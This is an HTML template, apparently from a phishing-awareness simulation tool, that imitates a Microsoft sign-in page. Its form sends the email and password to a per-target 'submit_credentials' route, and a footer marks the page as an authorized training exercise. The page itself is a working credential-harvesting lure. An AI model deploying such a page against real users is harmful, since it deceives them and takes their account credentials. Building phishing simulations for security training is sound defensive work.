<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to your account</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body class="landing-body">
  <div class="landing-card">

    <div class="landing-header">
      <h1>Microsoft</h1>
      <p>Sign in to verify your account</p>
    </div>

    <form class="landing-form" method="POST" action="{{ url_for('submit_credentials', token=token) }}">
      <label for="username">Email, phone, or Skype</label>
      <input type="text" id="username" name="username" autocomplete="username" required placeholder="someone@example.com">

      <label for="password">Password</label>
      <input type="password" id="password" name="password" autocomplete="current-password" required placeholder="Password">

      <button type="submit">Sign in</button>
    </form>

    <div class="landing-footer">
      [Authorized security awareness simulation — for training purposes only]
    </div>

  </div>
</body>
</html>
